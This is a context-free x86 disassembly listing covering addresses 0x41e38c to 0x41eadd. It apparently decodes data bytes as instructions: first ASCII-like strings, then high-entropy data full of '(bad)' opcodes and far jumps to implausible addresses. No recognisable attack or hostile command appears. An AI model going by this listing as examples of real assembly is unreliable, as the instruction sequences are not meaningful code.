  41e38c:	outs   dx,BYTE PTR ds:[esi]
  41e38d:	popa   
  41e38e:	imul   eax,DWORD PTR [edx+0x61],0x6b
  41e392:	jne    0x41e402
  41e394:	dec    ebx
  41e395:	add    BYTE PTR [ecx+0x45],bh
  41e398:	bound  ebp,QWORD PTR [ecx+0x46]
  41e39b:	dec    ecx
  41e39c:	ja     0x41e3e3
  41e39e:	dec    eax
  41e39f:	inc    ebp
  41e3a0:	inc    edx
  41e3a1:	push   ebx
  41e3a2:	add    BYTE PTR [eax],al
  41e3a4:	je     0x41e409
  41e3a6:	bound  esp,QWORD PTR [edi+0x78]
  41e3a9:	dec    eax
  41e3aa:	bound  edx,QWORD PTR [ebx+0x43]
  41e3ad:	pop    eax
  41e3ae:	outs   dx,DWORD PTR ds:[esi]
  41e3af:	push   0x4355
  41e3b4:	inc    edi
  41e3b5:	gs ins BYTE PTR es:[edi],dx
  41e3b7:	dec    esp
  41e3b8:	js     0x41e422
  41e3ba:	inc    edx
  41e3bb:	js     0x41e403
  41e3bd:	arpl   WORD PTR [eax],ax
  41e3bf:	add    BYTE PTR [eax],al
  41e3c1:	add    BYTE PTR [eax],al
  41e3c3:	add    BYTE PTR [edx+0x70],cl
  41e3c6:	jb     0x41e440
  41e3c8:	outs   dx,DWORD PTR ds:[esi]
  41e3c9:	pop    eax
  41e3ca:	dec    ebx
  41e3cb:	push   esp
  41e3cc:	dec    esp
  41e3cd:	jns    0x41e41a
  41e3cf:	js     0x41e449
  41e3d1:	outs   dx,BYTE PTR ds:[esi]
  41e3d2:	pop    ecx
  41e3d3:	jae    0x41e443
  41e3d5:	push   0x43644448
  41e3da:	arpl   WORD PTR [edx+0x55],sp
  41e3dd:	push   0x42504e67
  41e3e2:	push   ebp
  41e3e3:	je     0x41e45a
  41e3e5:	addr16 dec edi
  41e3e7:	dec    esp
  41e3e8:	inc    edx
  41e3e9:	ins    DWORD PTR es:[edi],dx
  41e3ea:	inc    esi
  41e3eb:	inc    esi
  41e3ec:	inc    esi
  41e3ed:	arpl   WORD PTR [edx+0x47],bx
  41e3f0:	push   ebp
  41e3f1:	inc    ebx
  41e3f2:	popa   
  41e3f3:	push   edx
  41e3f4:	dec    esp
  41e3f5:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  41e3fc:	push   ecx
  41e3fd:	push   ebx
  41e3fe:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  41e405:	dec    edx
  41e406:	jns    0x41e471
  41e408:	push   edx
  41e409:	inc    ebx
  41e40a:	jo     0x41e481
  41e40c:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  41e410:	fs push ebx
  41e412:	inc    ebx
  41e413:	push   ebp
  41e414:	push   eax
  41e415:	ja     0x41e491
  41e417:	jp     0x41e466
  41e419:	push   esi
  41e41a:	arpl   WORD PTR gs:[ecx+0x45],si
  41e41e:	dec    edx
  41e41f:	dec    esi
  41e420:	data16 ja 0x41e471
  41e423:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
  41e42a:	dec    esp
  41e42b:	cmp    ebx,ebp
  41e42d:	dec    esp
  41e42e:	lods   eax,DWORD PTR ds:[esi]
  41e42f:	out    dx,al
  41e430:	mov    ebp,0xa53ddffb
  41e435:	js     0x41e3f0
  41e437:	pushf  
  41e438:	push   esi
  41e439:	adc    al,0xa6
  41e43b:	push   edi
  41e43c:	mov    ch,0x1
  41e43e:	add    al,ch
  41e440:	add    DWORD PTR [eax],eax
  41e442:	add    BYTE PTR [ebx-0x60],ch
  41e445:	retf   
  41e446:	int    0x13
  41e448:	cmp    edx,DWORD PTR [eax+0x10]
  41e44b:	popf   
  41e44c:	ja     0x41e44f
  41e44e:	lea    edi,[eax+0x4c8d4e17]
  41e454:	inc    edi
  41e455:	sbb    ecx,edi
  41e457:	mov    WORD PTR [edi-0x1111cb5],ss
  41e45d:	imul   esi,DWORD PTR [edi+eiz*8+0x6340e123],0x5d
  41e465:	dec    edi
  41e466:	jp     0x41e453
  41e468:	jbe    0x41e479
  41e46a:	mov    bl,0x40
  41e46c:	inc    edi
  41e46d:	adc    bh,BYTE PTR [ecx]
  41e46f:	mov    ds:0xe074a7fd,eax
  41e474:	fs adc eax,0x57310bc4
  41e47a:	mov    al,0x5d
  41e47c:	push   edi
  41e47d:	dec    esp
  41e47e:	xadd   DWORD PTR [edi+edi*1],ebx
  41e482:	add    ah,bh
  41e484:	fscale 
  41e486:	fisubr WORD PTR [ecx-0x540b42df]
  41e48c:	sahf   
  41e48d:	jbe    0x41e4af
  41e48f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e490:	push   ebx
  41e491:	(bad)  [edi+0x155bf772]
  41e497:	test   BYTE PTR [eax+0x59],bl
  41e49a:	out    dx,eax
  41e49b:	jl     0x41e4df
  41e49d:	ret    
  41e49e:	es jle 0x41e434
  41e4a1:	mov    WORD PTR [eax+ebx*1-0x70],fs
  41e4a5:	adc    esi,DWORD PTR [edx+0x70]
  41e4a8:	(bad)  
  41e4a9:	mov    ah,0x46
  41e4ab:	push   ds
  41e4ac:	nop
  41e4ad:	imul   edi,DWORD PTR [ebp+0x21ecfb8f],0xffffff95
  41e4b4:	inc    esp
  41e4b5:	and    BYTE PTR [ebp-0x251fc048],0x3c
  41e4bc:	outs   dx,BYTE PTR ds:[esi]
  41e4bd:	aaa    
  41e4be:	mov    al,0x32
  41e4c0:	cdq    
  41e4c1:	fistp  QWORD PTR ds:0x7070d60c
  41e4c7:	icebp  
  41e4c8:	lds    edi,FWORD PTR [ecx+0x38]
  41e4cb:	add    esi,ecx
  41e4cd:	aam    0x61
  41e4cf:	(bad)  
  41e4d0:	or     al,0x4b
  41e4d2:	xchg   esi,eax
  41e4d3:	push   esi
  41e4d4:	in     al,dx
  41e4d5:	cmp    BYTE PTR [edx],dl
  41e4d7:	ins    BYTE PTR es:[edi],dx
  41e4d8:	pushf  
  41e4d9:	inc    eax
  41e4da:	mov    ebp,0x2d501dc3
  41e4df:	mov    BYTE PTR [ebx],ch
  41e4e1:	or     eax,0xb16bb76d
  41e4e6:	sbb    eax,0xcd8c1eb9
  41e4eb:	fdivr  DWORD PTR [ebx+0x1f9299d6]
  41e4f1:	in     eax,dx
  41e4f2:	jge    0x41e558
  41e4f4:	pop    edx
  41e4f5:	enter  0x1c75,0xbb
  41e4f9:	in     al,dx
  41e4fa:	pop    es
  41e4fb:	test   DWORD PTR [edi+0x55a5e19e],esp
  41e501:	or     DWORD PTR [esi-0x63],edx
  41e504:	mul    DWORD PTR [edi+0x11380294]
  41e50a:	or     DWORD PTR [edi+ebp*8],ebp
  41e50d:	inc    eax
  41e50e:	jnp    0x41e503
  41e510:	scas   al,BYTE PTR es:[edi]
  41e511:	push   ebx
  41e512:	jl     0x41e4e2
  41e514:	pop    esp
  41e515:	lahf   
  41e516:	xchg   edx,eax
  41e517:	arpl   WORD PTR [edi+0x4694c2f0],cx
  41e51d:	jae    0x41e58e
  41e51f:	aad    0x57
  41e521:	push   ebp
  41e522:	scas   eax,DWORD PTR es:[edi]
  41e523:	xor    BYTE PTR [esi+0x25],bh
  41e526:	stos   BYTE PTR es:[edi],al
  41e527:	inc    edx
  41e528:	test   DWORD PTR [eax],ebx
  41e52a:	call   0x39cf:0x1335abfc
  41e531:	fst    DWORD PTR [ebx]
  41e533:	sub    eax,0xe9f35978
  41e538:	or     eax,0x6e629da1
  41e53d:	xchg   esi,eax
  41e53e:	ds ins DWORD PTR es:[edi],dx
  41e540:	out    dx,al
  41e541:	shl    BYTE PTR [ebp-0x5ab32ab0],1
  41e547:	mov    esi,0x50da97b5
  41e54c:	rol    BYTE PTR [esi-0x69],1
  41e54f:	push   ecx
  41e550:	inc    edx
  41e551:	pushf  
  41e552:	cld    
  41e553:	lahf   
  41e554:	(bad)  
  41e555:	out    dx,eax
  41e556:	and    edx,edx
  41e558:	repz cmp DWORD PTR [ebx+0x6],0xffffffbb
  41e55d:	pop    esi
  41e55e:	gs retf 
  41e560:	gs inc ebx
  41e562:	push   eax
  41e563:	jg     0x41e510
  41e565:	int3   
  41e566:	push   es
  41e567:	mov    ss,esi
  41e569:	mov    esp,0x6f17f519
  41e56e:	popf   
  41e56f:	cli    
  41e570:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e571:	sbb    BYTE PTR [ecx-0x49],bl
  41e574:	xchg   BYTE PTR [ebp-0x6f708053],ch
  41e57a:	inc    esp
  41e57b:	adc    ecx,eax
  41e57d:	adc    esi,ebp
  41e57f:	push   ds
  41e580:	imul   ecx,ebx,0x55
  41e583:	test   DWORD PTR [esi],ecx
  41e585:	sbb    eax,0x66898254
  41e58a:	cmp    ecx,DWORD PTR [ebp-0x5d]
  41e58d:	inc    edx
  41e58e:	(bad)  
  41e58f:	mov    ebp,0xb115bad0
  41e594:	daa    
  41e595:	nop
  41e596:	inc    edi
  41e597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e598:	aad    0x48
  41e59a:	repz frstor [edi+esi*8+0x12cd8707]
  41e5a2:	inc    edi
  41e5a3:	cld    
  41e5a4:	add    BYTE PTR [ebp+0x2d],al
  41e5a7:	hlt    
  41e5a8:	xchg   edx,eax
  41e5a9:	mov    DWORD PTR [edx+0x5f192783],esp
  41e5af:	push   0x13
  41e5b1:	mov    ds:0x7b4198f7,eax
  41e5b6:	inc    esi
  41e5b7:	sub    bl,ah
  41e5b9:	add    BYTE PTR [edx+ebx*8-0x70db0bd3],0x30
  41e5c1:	or     ebx,edi
  41e5c3:	mov    esi,0x21aed2b
  41e5c8:	aad    0xf2
  41e5ca:	jge    0x41e5d1
  41e5cc:	mov    dh,0xfd
  41e5ce:	(bad)  
  41e5cf:	mov    cl,cl
  41e5d1:	jp     0x41e631
  41e5d3:	mov    eax,0x877e1172
  41e5d8:	lods   eax,DWORD PTR ds:[esi]
  41e5d9:	add    eax,DWORD PTR [edx-0x3b]
  41e5dc:	adc    ah,0x16
  41e5df:	es jle 0x41e65b
  41e5e2:	or     esi,DWORD PTR [edi+0x8]
  41e5e5:	xchg   DWORD PTR [ebx-0x603865e5],eax
  41e5eb:	(bad)  
  41e5ec:	dec    ecx
  41e5ed:	mov    ch,0x55
  41e5ef:	fsubr  QWORD PTR [ebp-0x5b]
  41e5f2:	and    BYTE PTR [esi+0x2c],dh
  41e5f5:	jno    0x41e660
  41e5f7:	mov    ss:0xe0187d7b,eax
  41e5fd:	inc    ecx
  41e5fe:	scas   al,BYTE PTR es:[edi]
  41e5ff:	mov    ah,0x81
  41e601:	popf   
  41e602:	mov    esp,ebp
  41e604:	ror    DWORD PTR [eax+0x678e7994],cl
  41e60a:	jnp    0x41e5ee
  41e60c:	cmp    eax,0xa941e076
  41e611:	jb     0x41e5cf
  41e613:	cmp    ebp,ebx
  41e615:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e616:	lahf   
  41e617:	into   
  41e618:	push   ebx
  41e619:	push   ebx
  41e61a:	(bad)  
  41e61b:	sub    DWORD PTR [eax],edx
  41e61d:	dec    edi
  41e61e:	pop    edi
  41e61f:	arpl   WORD PTR [esi+0x7bde38d9],cx
  41e625:	add    DWORD PTR [edi],eax
  41e627:	jb     0x41e5ff
  41e629:	and    eax,0xa5b22831
  41e62e:	push   edx
  41e62f:	mov    edi,0x7cfaff57
  41e634:	xlat   BYTE PTR fs:[ebx]
  41e636:	push   esi
  41e637:	dec    esi
  41e638:	clc    
  41e639:	add    ch,BYTE PTR [ebx]
  41e63b:	aas    
  41e63c:	mov    bh,0x1
  41e63e:	add    al,ch
  41e640:	add    DWORD PTR [eax],eax
  41e642:	add    BYTE PTR [ebx-0x1e],bl
  41e645:	push   es
  41e646:	jo     0x41e5f7
  41e648:	ins    BYTE PTR es:[edi],dx
  41e649:	pop    esi
  41e64a:	in     eax,0x3c
  41e64c:	mov    bl,BYTE PTR ds:0x5e097dbd
  41e652:	cmp    esp,DWORD PTR [ecx-0x145dc0a0]
  41e658:	dec    edi
  41e659:	imul   ebp,DWORD PTR [esi+0x4eaa9cc8],0x6cef376b
  41e663:	push   cs
  41e664:	pop    ebx
  41e665:	or     BYTE PTR [eax+edx*4-0x52],dl
  41e669:	mov    eax,0x1df77860
  41e66e:	inc    ecx
  41e66f:	bound  ebx,QWORD PTR [ebx-0x5d]
  41e672:	inc    ebx
  41e673:	bnd jnp 0x41e5f6
  41e676:	inc    esp
  41e677:	(bad)  
  41e678:	cmp    al,0x45
  41e67a:	inc    edx
  41e67b:	cmp    esi,ebx
  41e67d:	mov    ebp,0xa4851903
  41e682:	xlat   BYTE PTR ds:[ebx]
  41e683:	mov    esi,0x265b23e1
  41e688:	nop
  41e689:	add    al,0x96
  41e68b:	repz add BYTE PTR [eax-0x2143d854],cl
  41e692:	sahf   
  41e693:	ja     0x41e6af
  41e695:	mov    ds:0x2821ed4e,eax
  41e69a:	or     esp,DWORD PTR [edx]
  41e69c:	retf   
  41e69d:	aaa    
  41e69e:	xor    BYTE PTR [edx+0x2f],0x4
  41e6a2:	sub    dh,BYTE PTR [ebp-0xa0ad8df]
  41e6a8:	or     al,0x5
  41e6aa:	inc    ebp
  41e6ab:	popf   
  41e6ac:	xchg   edx,eax
  41e6ad:	stc    
  41e6ae:	jo     0x41e6ac
  41e6b0:	mov    dh,0x9b
  41e6b2:	mov    eax,0x24502e49
  41e6b7:	xchg   DWORD PTR [edi+ebp*2+0x15b1e5c7],ebx
  41e6be:	jmp    0x76bdef4a
  41e6c3:	les    ecx,FWORD PTR [ebp+0x2806f805]
  41e6c9:	je     0x41e6d4
  41e6cb:	xchg   edi,eax
  41e6cc:	sub    BYTE PTR [edx+0x47],al
  41e6cf:	jecxz  0x41e73b
  41e6d1:	xchg   si,ax
  41e6d3:	and    cl,BYTE PTR [esp+ecx*8-0x8]
  41e6d7:	mov    al,ds:0x571d185e
  41e6dc:	jmp    0x64a0e6c4
  41e6e1:	push   esp
  41e6e2:	mov    ecx,DWORD PTR [edi]
  41e6e4:	(bad)  
  41e6e5:	std    
  41e6e6:	mov    ebx,0xee524a72
  41e6eb:	rcr    BYTE PTR [eax-0x6a2837f7],cl
  41e6f1:	(bad)  
  41e6f2:	jl     0x41e76f
  41e6f4:	inc    esp
  41e6f5:	rcl    ebx,0x73
  41e6f8:	aas    
  41e6f9:	popf   
  41e6fa:	pop    es
  41e6fb:	inc    ebp
  41e6fc:	loope  0x41e729
  41e6fe:	sbb    DWORD PTR [esi],esi
  41e700:	hlt    
  41e701:	add    bh,bh
  41e703:	xor    eax,esi
  41e705:	arpl   WORD PTR [edx+ecx*2],ax
  41e708:	push   cs
  41e709:	lods   al,BYTE PTR ds:[esi]
  41e70a:	mov    edx,0x19254cfb
  41e70f:	mov    ds:0x33e578a0,al
  41e714:	out    dx,eax
  41e715:	dec    edx
  41e716:	inc    edi
  41e717:	repnz shl DWORD PTR [eax-0x1fc66699],1
  41e71e:	xchg   edx,eax
  41e71f:	sub    DWORD PTR [edi+0x43],esp
  41e722:	aas    
  41e723:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e724:	cmp    bh,BYTE PTR [edi]
  41e726:	jp     0x41e6d5
  41e728:	ret    
  41e729:	mov    bh,0xb2
  41e72b:	out    dx,al
  41e72c:	xchg   BYTE PTR [ebp-0x501daa54],cl
  41e732:	cmp    DWORD PTR [ebx+0x7f129543],eax
  41e738:	imul   esi,edi,0x68
  41e73b:	es fs cmc 
  41e73e:	inc    eax
  41e73f:	pop    edi
  41e740:	fwait
  41e741:	test   eax,0x68bd4ac0
  41e746:	pop    edx
  41e747:	shr    edx,1
  41e749:	dec    eax
  41e74a:	mov    esi,0x5e72dac3
  41e74f:	mov    ah,0x50
  41e751:	push   ebp
  41e752:	jbe    0x41e7a5
  41e754:	pop    ss
  41e755:	shl    BYTE PTR [edx-0x48],1
  41e758:	cmp    BYTE PTR [ecx-0x66edde56],ah
  41e75e:	test   BYTE PTR es:[eax-0x46],cl
  41e762:	mov    eax,0x7bc7107c
  41e767:	push   ds
  41e768:	xchg   edi,eax
  41e769:	inc    ebp
  41e76a:	push   0xf348d4b3
  41e76f:	fs cld 
  41e771:	push   ss
  41e772:	xor    BYTE PTR [esi],0xc4
  41e775:	retf   
  41e776:	mov    ecx,0xfd4cd1e3
  41e77b:	(bad)  
  41e77c:	fidivr DWORD PTR [eax+0xf]
  41e77f:	or     al,BYTE PTR [edx+0x49]
  41e782:	inc    ebx
  41e783:	push   cs
  41e784:	(bad)  
  41e785:	and    al,0xd2
  41e787:	call   0x405be0eb
  41e78c:	mov    edx,0xf048cc45
  41e791:	cmp    BYTE PTR [ecx+esi*1],ah
  41e794:	jno    0x41e7c1
  41e796:	jg     0x41e7be
  41e798:	ins    BYTE PTR es:[edi],dx
  41e799:	mov    ecx,0x662055d4
  41e79f:	enter  0x4bcd,0x3
  41e7a3:	fbstp  TBYTE PTR [edx-0xb]
  41e7a6:	push   ebx
  41e7a7:	(bad)  
  41e7a8:	push   ss
  41e7a9:	sbb    BYTE PTR [ebp+0x37ffcadc],dh
  41e7af:	(bad)  
  41e7b0:	cmp    DWORD PTR ds:[edi-0xa08582],esp
  41e7b7:	in     eax,0x75
  41e7b9:	retf   
  41e7ba:	pop    esi
  41e7bb:	xchg   esi,eax
  41e7bc:	(bad)  [esi-0x54]
  41e7bf:	jb     0x41e831
  41e7c1:	into   
  41e7c2:	arpl   WORD PTR [ebp+0x5d335f09],sp
  41e7c8:	popa   
  41e7c9:	mov    esi,0x4d308a73
  41e7ce:	dec    eax
  41e7cf:	mov    eax,DWORD PTR [ebx]
  41e7d1:	iret   
  41e7d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7d3:	jae    0x41e7f3
  41e7d5:	clc    
  41e7d6:	mov    cl,0xba
  41e7d8:	jbe    0x41e7fd
  41e7da:	imul   ecx,DWORD PTR [edx+0x56e061cc],0xffffff8a
  41e7e1:	xor    bl,bh
  41e7e3:	in     al,0xce
  41e7e5:	xor    dh,BYTE PTR [ebx+0x57]
  41e7e8:	inc    ebx
  41e7e9:	mov    ebx,ss
  41e7eb:	adc    BYTE PTR [edx+ebp*4+0x78],ah
  41e7ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7f0:	clc    
  41e7f1:	fnstsw WORD PTR [eax+esi*8]
  41e7f4:	pushf  
  41e7f5:	aas    
  41e7f6:	ins    DWORD PTR es:[edi],dx
  41e7f7:	add    DWORD PTR [esi+0x73],ecx
  41e7fa:	rol    DWORD PTR [edx+0x71cf875a],0xb
  41e801:	sbb    ebp,0xdf8a225
  41e807:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e808:	jp     0x41e7d0
  41e80a:	adc    ebx,DWORD PTR [ebx+edx*4]
  41e80d:	dec    ecx
  41e80e:	cmp    edx,edi
  41e810:	pop    esi
  41e811:	cmc    
  41e812:	jbe    0x41e85c
  41e814:	xchg   ecx,eax
  41e815:	aam    0x33
  41e817:	xchg   edi,eax
  41e818:	add    eax,0x64646608
  41e81d:	call   DWORD PTR [edi-0x5f]
  41e820:	(bad)  
  41e821:	mov    WORD PTR [esi-0x73],gs
  41e824:	rol    eax,0x5b
  41e827:	mov    ebp,0xb3ec71d8
  41e82c:	push   ebp
  41e82d:	jg     0x41e7b0
  41e82f:	jmp    FWORD PTR [ebx-0x69418801]
  41e835:	push   0x4df56557
  41e83a:	aad    0x27
  41e83c:	mov    ecx,0x1e80001
  41e841:	add    BYTE PTR [eax],al
  41e843:	pop    esp
  41e844:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e845:	leave  
  41e846:	stos   BYTE PTR es:[edi],al
  41e847:	or     dl,BYTE PTR [edx-0x72f34985]
  41e84d:	loop   0x41e8cb
  41e84f:	jecxz  0x41e8c2
  41e851:	neg    DWORD PTR [edi]
  41e853:	mov    dl,0x4c
  41e855:	dec    edi
  41e856:	dec    esp
  41e857:	adc    al,0xfa
  41e859:	into   
  41e85a:	leave  
  41e85b:	ins    DWORD PTR es:[edi],dx
  41e85c:	in     eax,dx
  41e85d:	and    DWORD PTR [ebx+0x5657172f],ebx
  41e863:	mov    esp,0x1784a22a
  41e868:	jno    0x41e8c5
  41e86a:	mov    bl,0xea
  41e86c:	inc    ebx
  41e86d:	and    al,dl
  41e86f:	out    0x2e,al
  41e871:	or     edi,ebp
  41e873:	jmp    0x3de7:0x865baea4
  41e87a:	mov    dl,0x3f
  41e87c:	mov    al,ds:0xef766c3d
  41e881:	add    dh,BYTE PTR [esi]
  41e883:	dec    esp
  41e884:	js     0x41e87a
  41e886:	cli    
  41e887:	aad    0xd3
  41e889:	inc    ebx
  41e88a:	and    ebx,DWORD PTR [eax-0x61f2a383]
  41e890:	lods   eax,DWORD PTR ds:[esi]
  41e891:	loop   0x41e882
  41e893:	jmp    0x4b75:0xf4e8a0c0
  41e89a:	sbb    DWORD PTR es:[ebp+0x13],ebx
  41e89e:	pop    edx
  41e89f:	push   ebp
  41e8a0:	cmc    
  41e8a1:	mov    ah,0x90
  41e8a3:	adc    esp,DWORD PTR [edi+ebp*2+0x79]
  41e8a7:	hlt    
  41e8a8:	inc    eax
  41e8a9:	mov    ebx,0xd95eb559
  41e8ae:	xlat   BYTE PTR ds:[ebx]
  41e8af:	out    dx,eax
  41e8b0:	fwait
  41e8b1:	ror    bh,0xe6
  41e8b4:	sbb    al,0xc0
  41e8b6:	or     DWORD PTR [edx],ebx
  41e8b8:	in     eax,0x63
  41e8ba:	inc    edx
  41e8bb:	pop    ecx
  41e8bc:	stc    
  41e8bd:	jb     0x41e8a3
  41e8bf:	cli    
  41e8c0:	push   ebp
  41e8c1:	call   0x184f:0xaf077b84
  41e8c8:	push   ebx
  41e8c9:	jo     0x41e879
  41e8cb:	mov    ds:0x1837283a,eax
  41e8d0:	push   esp
  41e8d1:	dec    ebp
  41e8d2:	aad    0x63
  41e8d4:	xchg   esp,eax
  41e8d5:	mov    ds:0xf6d849f7,ax
  41e8db:	jle    0x41e882
  41e8dd:	mov    ch,0xa1
  41e8df:	add    eax,0x49d60dcf
  41e8e4:	lods   al,BYTE PTR ds:[esi]
  41e8e5:	stos   BYTE PTR es:[edi],al
  41e8e6:	outs   dx,BYTE PTR ds:[esi]
  41e8e7:	push   cs
  41e8e8:	fist   WORD PTR [ebx+0x34d7154e]
  41e8ee:	push   eax
  41e8ef:	dec    ecx
  41e8f0:	adc    DWORD PTR [ebx+0x6a],esi
  41e8f3:	shl    BYTE PTR [ebp+0x29],cl
  41e8f6:	sti    
  41e8f7:	int3   
  41e8f8:	inc    edx
  41e8f9:	adc    dl,BYTE PTR [edx+0x381f96c0]
  41e8ff:	fwait
  41e900:	add    eax,DWORD PTR [eax-0x5f]
  41e903:	out    dx,al
  41e904:	jge    0x41e983
  41e906:	jp     0x41e946
  41e908:	(bad)  
  41e909:	dec    DWORD PTR [edx]
  41e90b:	lods   al,BYTE PTR ds:[esi]
  41e90c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e90d:	sbb    esi,DWORD PTR [edx-0x1810d3cb]
  41e913:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e914:	inc    ebp
  41e915:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e916:	pop    esp
  41e917:	mov    bh,0x46
  41e919:	fdivp  st(2),st
  41e91b:	or     DWORD PTR [ebp*8+0x2b1c4ca9],eax
  41e922:	sbb    BYTE PTR [esi],dh
  41e924:	mov    BYTE PTR [ebx],bh
  41e926:	pop    eax
  41e927:	sub    ah,ah
  41e929:	xor    eax,0x80cd0eb0
  41e92e:	nop
  41e92f:	les    esi,FWORD PTR [ecx-0xb]
  41e932:	test   BYTE PTR [edx+0x6],cl
  41e935:	sub    eax,0xf62654f5
  41e93a:	mov    eax,0xaf9be4a1
  41e93f:	pop    ss
  41e940:	aas    
  41e941:	outs   dx,BYTE PTR ds:[esi]
  41e942:	push   eax
  41e943:	mov    ah,0xc1
  41e945:	push   esi
  41e946:	cmp    ebx,ebx
  41e948:	(bad)  
  41e949:	and    BYTE PTR [ebx-0x4516437d],bh
  41e94f:	shl    BYTE PTR [edi+ecx*4-0x4d1d9478],1
  41e956:	test   eax,0xd64d6ada
  41e95b:	sbb    eax,DWORD PTR [esi-0x4ca23891]
  41e961:	jle    0x41e907
  41e963:	(bad)  
  41e964:	fwait
  41e965:	cld    
  41e966:	rcr    esi,cl
  41e968:	xchg   BYTE PTR [esi+edx*2+0x1008e8e0],bl
  41e96f:	sbb    eax,0x2b89784d
  41e974:	sti    
  41e975:	mov    BYTE PTR [eax-0x7d4c87f3],bl
  41e97b:	aad    0xcf
  41e97d:	mov    ds:0x698041ed,eax
  41e983:	push   es
  41e984:	aas    
  41e985:	jge    0x41e996
  41e987:	mov    ds:0x477cdfc5,eax
  41e98c:	(bad)  
  41e98d:	aaa    
  41e98e:	retf   0xd8cb
  41e991:	fisubr DWORD PTR [edi+0x5a9edd11]
  41e997:	icebp  
  41e998:	in     eax,dx
  41e999:	scas   al,BYTE PTR es:[edi]
  41e99a:	test   DWORD PTR [ecx-0x34],esi
  41e99d:	dec    esp
  41e99e:	arpl   WORD PTR [edi-0x77],si
  41e9a1:	jmp    0xf72df4c6
  41e9a6:	in     al,0x69
  41e9a8:	push   ss
  41e9a9:	rcl    BYTE PTR [ecx],cl
  41e9ab:	cmp    ch,dl
  41e9ad:	(bad)  
  41e9ae:	loope  0x41e9b9
  41e9b0:	retf   0x81ae
  41e9b3:	mov    esp,0x1e37455d
  41e9b8:	mov    edi,0x3ac5cd27
  41e9bd:	jns    0x41e9f6
  41e9bf:	push   ss
  41e9c0:	sbb    al,0xad
  41e9c2:	ds inc ebp
  41e9c4:	mov    ds,WORD PTR ds:[edx]
  41e9c7:	mov    ch,0xb8
  41e9c9:	mov    DWORD PTR [eax+ebx*4],ebp
  41e9cc:	push   esp
  41e9cd:	cmp    cl,BYTE PTR [esi+0x72]
  41e9d0:	lahf   
  41e9d1:	lock push esi
  41e9d3:	(bad)  
  41e9d4:	jmp    0x41e95a
  41e9d6:	xor    cl,BYTE PTR es:[ebx-0x6c]
  41e9da:	loope  0x41ea23
  41e9dc:	cs (bad) 
  41e9de:	and    DWORD PTR [ebx-0x6b145ef2],ebx
  41e9e4:	or     eax,0xf3fb6682
  41e9e9:	and    cl,BYTE PTR [ecx+0x4ec10d7a]
  41e9ef:	clc    
  41e9f0:	add    eax,0xdf4d4ad2
  41e9f5:	or     BYTE PTR [esi+0x64],dh
  41e9f8:	mov    esi,0x93aa48a6
  41e9fd:	pop    ebp
  41e9fe:	cmp    BYTE PTR ds:0x8586c959,cl
  41ea04:	out    0xc7,al
  41ea06:	shl    BYTE PTR [esi-0x1ca5a415],1
  41ea0c:	dec    edi
  41ea0d:	sub    ebx,eax
  41ea0f:	jnp    0x41e9d3
  41ea11:	jle    0x41e9c3
  41ea13:	mov    WORD PTR [ebx],gs
  41ea15:	adc    eax,0xb5060826
  41ea1a:	(bad)  
  41ea1b:	cs sub ah,dh
  41ea1e:	cmp    eax,DWORD PTR [eax]
  41ea20:	jo     0x41ea0e
  41ea22:	xchg   esp,eax
  41ea23:	mov    ah,0x22
  41ea25:	cmp    eax,0xa48e08c6
  41ea2a:	mov    esi,0x243ad638
  41ea2f:	(bad)  
  41ea30:	in     al,dx
  41ea31:	fimul  WORD PTR ds:[edi-0x3753942b]
  41ea38:	jnp    0x41e9e0
  41ea3a:	dec    ebx
  41ea3b:	btc    DWORD PTR [ecx],eax
  41ea3e:	add    al,ch
  41ea40:	add    DWORD PTR [eax],eax
  41ea42:	add    BYTE PTR [ebp-0x7a],bl
  41ea45:	and    eax,0x55a92186
  41ea4a:	adc    al,bl
  41ea4c:	es mov al,0x7a
  41ea4f:	repz in al,dx
  41ea51:	iret   
  41ea52:	inc    esp
  41ea53:	cmp    al,0x17
  41ea55:	cdq    
  41ea56:	jg     0x41e9f7
  41ea58:	xor    eax,0x744b2fb4
  41ea5d:	outs   dx,DWORD PTR ds:[esi]
  41ea5e:	add    ebp,DWORD PTR [edi+0x1192715e]
  41ea64:	push   DWORD PTR [esi-0x3451b7f1]
  41ea6a:	cmp    eax,0xa791d91c
  41ea6f:	and    dl,ah
  41ea71:	xchg   ebp,eax
  41ea72:	mov    al,ds:0x93e10098
  41ea77:	mov    DWORD PTR [eax-0x6746b611],0x2a402752
  41ea81:	popa   
  41ea82:	add    BYTE PTR [eax-0x761d3a3f],cl
  41ea88:	imul   ecx,edx,0x51
  41ea8b:	xor    al,0x19
  41ea8d:	ret    0x6a0e
  41ea90:	sbb    al,0xca
  41ea92:	dec    ebx
  41ea93:	jge    0x41ea30
  41ea95:	and    BYTE PTR [edx+ebx*2],dl
  41ea98:	or     ecx,DWORD PTR [edi]
  41ea9a:	mov    edx,0xd2eec07d
  41ea9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eaa0:	xchg   BYTE PTR [edx+eiz*2-0x67],al
  41eaa4:	aas    
  41eaa5:	or     esp,DWORD PTR ds:0xa0422632
  41eaab:	hlt    
  41eaac:	ja     0x41ead4
  41eaae:	call   0x3dca:0x41a5268
  41eab5:	mul    BYTE PTR [ebp+0x47]
  41eab8:	mov    cl,BYTE PTR [eax]
  41eaba:	dec    ecx
  41eabb:	jecxz  0x41ea90
  41eabd:	mov    al,ds:0x49ca62dc
  41eac2:	mov    bh,0xb0
  41eac4:	(bad)
  41eac8:	add    eax,0x253d09dc
  41eacd:	mov    ebx,DWORD PTR [esi]
  41eacf:	jnp    0x41eacd
  41ead1:	or     eax,0xc4785d98
  41ead6:	test   DWORD PTR [esi],edx
  41ead8:	xor    eax,0xb79e975e
  41eadd:	ret    
